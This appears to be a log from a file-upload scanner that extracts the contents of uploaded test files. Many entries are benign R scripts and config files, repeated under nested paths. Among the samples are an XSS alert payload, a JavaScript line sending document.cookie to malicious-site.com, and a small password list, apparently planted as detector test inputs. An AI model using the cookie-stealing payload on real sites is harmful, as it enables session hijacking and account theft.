2025-02-22 20:58:10,000 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:58:10,002 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:58:10,004 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:58:10,005 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:58:10,007 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:58:10,008 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:58:10,009 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:58:10,011 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:58:10,012 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:58:10,013 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:58:10,014 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:58:10,016 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:58:10,017 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:58:10,018 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:58:10,020 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:58:10,021 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:58:10,023 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:58:10,024 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:58:10,025 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:58:10,026 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:58:10,027 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:58:10,029 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:58:10,031 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:58:10,032 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:58:10,033 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:58:10,035 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:58:10,036 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:58:10,037 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:58:10,038 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:58:10,040 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:58:10,041 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:58:10,042 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:58:10,044 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:58:10,045 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:58:10,047 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:58:10,048 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:58:10,050 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:58:10,051 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:58:10,053 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:58:10,054 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:58:10,056 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:58:10,058 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:58:10,060 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:58:10,062 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:58:10,065 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:58:10,067 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:58:10,069 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:58:10,071 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:58:10,073 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:58:10,077 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:58:10,078 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:58:10,080 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:58:10,082 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:58:10,084 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:58:10,086 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:58:10,088 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:58:10,089 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:58:10,091 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:58:10,093 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:58:10,097 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:58:10,099 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:58:10,101 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:58:10,103 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:58:10,105 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:58:10,108 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:58:10,109 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:58:10,111 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:58:10,113 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:58:10,114 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:58:10,117 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:58:10,118 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:58:10,120 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:58:10,121 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:58:10,122 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:58:10,124 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:58:10,125 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:58:10,126 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:58:10,127 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:58:10,128 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:58:10,131 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:58:10,132 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:58:10,133 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:58:10,134 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:58:10,135 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:58:10,136 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:58:10,137 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:58:10,138 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
